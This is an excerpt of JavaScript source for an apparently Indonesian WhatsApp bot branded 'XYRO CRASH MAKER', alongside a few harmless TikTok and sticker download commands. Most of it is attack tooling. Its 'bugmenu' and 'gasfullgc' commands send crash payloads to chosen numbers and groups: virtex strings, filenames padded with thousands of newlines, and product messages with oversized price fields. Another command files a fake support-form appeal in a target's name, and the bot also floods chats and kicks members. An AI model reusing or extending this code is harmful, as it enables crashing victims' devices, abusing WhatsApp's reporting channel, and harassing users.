...
const { paijo } = require('./baseikal/virtex/paijoo')
const { mata } = require('./mata')
const { mata1 } = require('./mata1')
...
switch(command) {
    case "send1":
        if (!text) m.reply("gaje")
     const num = text.split("|")[0]+'@s.whatsapp.net'
    haikal.sendMessage(num, { text : "🦅🇨🇨 XYRO CRASH MAKER 🇨🇨🦅"}, {quoted:kalgans})
        break
case 'ttmp3': {
                if (!text) m.reply('Masukkan Query Link!')
                m.reply('Tunggu Sebentar. . .')
                let json = await fetchJson(`https://api.tiklydown.me/api/download?url=${text}`)
                if (json?.music?.play_url == undefined) return m.reply('Sorry an error occurred!')
                let teks = `No Watermark Nih Bang!`
                let Message = {
...
case 'tt': {
                ...
                m.reply('Tunggu Sebentar. . .')
                let json = await fetchJson(`https://api.tiklydown.me/api/download?url=${text}`)
                if (json?.video?.noWatermark == undefined) return m.reply('Sorry an error occurred!')
                let teks = `No Watermark Nih Bang!`
                let Message = {
 ...
 case "stele":
//try{
if (!text) return m.reply(`Example : ${command} https://t.me/addstickers/UGM_by_fStikBot`)
  m.reply("wet")      
data = await getBuffer(`https://api.neoxr.eu/api/telesticker?url=${q}&apikey=EOjT1N`)
//for (let v of kontol) {
//for (let i of data) {
   //await sleep(1500)
haikal.sendMessage(m.chat, { webp: i.url, packname: `Add By Tele\n${q}`, author: `Bot By\nXyro Ganteng 🇮🇩`}, {quoter:m}) 
...
break
    case "leave2":
if (!text) return m.reply(`maulu apaan🗿`) 
m.reply(`Otw out gc target`)
await sleep(1500)
const Alhamdulillah  = `${q}+"@g.us"`
haikal.groupLeave(Alhamdulillah)
        m.reply(`Gw udh Out`)
break
case '🥔': case '🌰': case '🎂': case '🍆': case '🥑': case '🥒': case '🥦': case '🌽': case '🍠': case '🥕': case '🌶️': case '🍅': case '🥥': case '🍇': case '🥝': case '🍐': case '🍏': case '🍈': case '🍋': case '🍌': case '🍍': case '🍊': case '🍑': case '🍉': case '🍎': case '🍒️': case '🍓': case '🍄': case '🌻': case '🏵️': case '💮': case '🌸': case '🌺': case '🥀': case '🌹': case '🤯': case '🖕': case '🤙': case '💋': case '💦': case '💩': case '👿': case '👻': case '🤡': case '🤮': case '😇': case '😠': case '😭': case '🔥': case '😎': case '😜': case '😡': case '🤫': case '❤️': case '😱': case '🤣': case '😂': case '😘': case '💔': case '👊': {
...
//"mimetype": "application/vnd.openxmlformats-offi cedocument.presentationml.presentation"
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
...
"fileName": `🔥👿 𝑿𝒀𝑹𝑶 𝑻𝒁𝒀 👿🔥\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.🔥😈 Xyro 😈🔥${mata}${buttonvirus}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
...
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./bokep.jpg") }, { upload: haikal.waUploadToServer })
...
"title": `𝗘𝗟𝗔𝗜𝗡𝗔\n\n${mata}${mata1}`,
"description": `𝗘𝗟𝗔𝗜𝗡𝗔 ${buttonvirus}${mata}`,
"currencyCode": "USD",
"bodyText": `PELER🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥${buttonvirus}`,
"footerText": `${mata}${buttonvirus}`,
"priceAmount1000": "999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999",
"productImageCount": 923456789,
"firstImageId": 1,
"salePriceAmount1000": "999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999",
...
case 'bugmenu': {
//m.reply(`Tunggu Sebentar. . .`)
haikal.sendMessage(from, {image:{url:'https://telegra.ph/file/4fbcb9674b663db507df8.jpg'}, caption:`𝐗𝐘𝐑𝐎 𝐓𝐙𝐘 𝐀𝐓𝐓𝐀𝐂𝐊𝐄𝐑\n\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬\nHay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*UNTUK MEMBERIKAN AKSES*
🔏 addprem (628xx)
...
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return m.reply(`Tidak bisa verif My Creator!`)
const peler = `Привет WhatsApp

Позвольте мне представить вам Оливию из России.

Я отправил сообщение в WhatsApp с намерением попросить помощи в разблокировке моей учетной записи WhatsApp.

Я уверен, что я не нарушил ни одного из условий или политик, предоставленных самим WhatsApp.

Возможно, мой аккаунт в WhatsApp был взломан и неправильно использован безответственными людьми, и у меня могут быть чувства обиды или зависти к моему успеху, но я не чувствую желания делать что-либо вредное другим.

А в моем аккаунте WhatsApp есть данные "важные о компании и потребностях моих детей" для посещения школы.

Я обещаю уважаемой стороне WhatsApp не повторять моих ошибок и упущений.

Возвращаясь к моей первой цели, я хочу, чтобы моя учетная запись WhatsApp была разблокирована, это мой заблокированный номер WhatsApp

[ +${targetnya} ].

Еще раз я умоляю и прошу уважаемого WhatsApp о помощи, чтобы разблокировать мою учетную запись WhatsApp.

Спасибо тебе за взрыв WhatsApp`
var targetnya = tosend.split('@')[0]
const bnnd = text.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await haikal.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
...
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", peler)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
...
case 'gasfullgc' : {
 ...
 if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
// m.reply(`Tunggu Sebentar. . .`)
if (!args[0]) return m.reply(`mana id gc nya blok`)
    m.reply(`OTW KIRIM BUG\nGRUB LANGSUNG GW TUTUP 10 MENIT!!`)
 await sleep(2000)
 haikal.groupSettingUpdate(from, 'announcement')
const Pe = text.split("|")[0]+'@g.us'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: '📄 𝑿𝒀𝑹𝑶 𝑻𝒁𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀.exe' }, { quoted:kalgans })
await sleep(2000)
haikal.sendMessage(Pe, { image: ppnyauser,  caption: '📄 𝑿𝒀𝑹𝑶 𝑻𝒁𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀.exe' }, { quoted:kalgans })
await sleep(2000)
haikal.sendMessage(Pe, { image: ppnyauser,  caption: '📄 𝑿𝒀𝑹𝑶 𝑻𝒁𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀.exe' }, { quoted:kalgans })
...
// BUG OWNER
 ...
 haikal.groupSettingUpdate(from, 'announcement')
const Pe = text.split("|")[0]+'@g.us'
haikal.sendMessage(Pe, {text: `📄 𝑿𝒀𝑹𝑶 𝑻𝒁𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀.apk`}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: `📄 𝑿𝒀𝑹𝑶 𝑻𝒁𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀.apk`}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: `📄 𝑿𝒀𝑹𝑶 𝑻𝒁𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀.apk`}, {quoted:kalgans})
...
//m.reply(`OTW KIRIM BUG\nGRUB LANGSUNG GW TUTUP 10 MENIT!!`)
 ...
 //haikal.groupSettingUpdate(from, 'announcement')
 await sleep(2000)
haikal.sendMessage(from, {text: `📄 𝑿𝒀𝑹𝑶 𝑻𝒁𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀.pdf`}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: `📄 𝑿𝒀𝑹𝑶 𝑻𝒁𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀.pdf`}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: `📄 𝑿𝒀𝑹𝑶 𝑻𝒁𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀.pdf`}, {quoted:kalgans})
...
if (!isCreator) return m.reply(`*khusus Premium*`)
m.reply(`Tunggu Sebentar. . .`)
haikal.sendMessage(from, { image: ppnyauser,  caption:paijo }, { quoted:kalgans })
await sleep(2000)
haikal.sendMessage(from, { image: ppnyauser,  caption:paijo }, { quoted:kalgans })
await sleep(2000)
haikal.sendMessage(from, { image: ppnyauser,  caption:paijo }, { quoted:kalgans })
...
m.reply(`*Sukses mengirim Bug Ke ${q}*\nTunggu Grub Dibuka Lagi`)
//await sleep(6000)
haikal.groupSettingUpdate(m.chat, 'not_announcement')
await sleep(2000)
m.reply(`Sudah Buka Grubnya Ownerku!!*`)
break
//=================================================//
case 'jadidocu': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} text\nContoh ${prefix+command} Xyro`)
//m.reply(`Tunggu Sebentar. . .`)
jumlah = `1`
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
...
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `${q}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${q}\n\n\n\n\n${buttonvirus}${mata}${mata1}${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206"
//"caption":` ${botname} ${buttonkal}`,
...
m.reply(`Tunggu 5 Detik Untuk Kick Otomatis`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await sleep (5000)
haikal.groupParticipantsUpdate(from, [users], 'remove')
}
break
//=================================================//
case 'add': 
m.reply(`command ini telah disable permanent oleh owner`)
break
//=================================================//
case 'promote': {
if (!isCreator) return m.reply(`*khusus Premium*`)
...
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await sleep (2000)
haikal.groupParticipantsUpdate(from, [users], 'promote')
}
break
//=================================================//
case 'demote': {
...
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await sleep (2000)
 haikal.groupParticipantsUpdate(from, [users], 'demote')
}
break
//=================================================//
case 'h': {
...
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply(`Tunggu Sebentar. . .`)
if (args.length == 0) return m.reply(`Example: ${prefix + command} Znxn Xyz`)
ini_txt = args.join(" ")
...
if (args[0].startsWith(`+6281214281312`)) return m.reply('Tidak bisa call ke nomor ini!')
...
if (!isCreator) return m.reply(`*khusus Premium*`)
m.reply(`Tunggu Sebentar. . .`)
if (args.length == 0) return await m.reply(`Example: ${prefix + command} melukis senja`)
axios
.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${command}`)
.then(({ data }) => {
...
if (!isCreator) return m.reply('*Khusus Owner Bot*')
m.reply(`Tunggu Sebentar. . .`)
if (args.length < 1) return m.reply('Nama pdf apa')
let teks = `${text}`
{
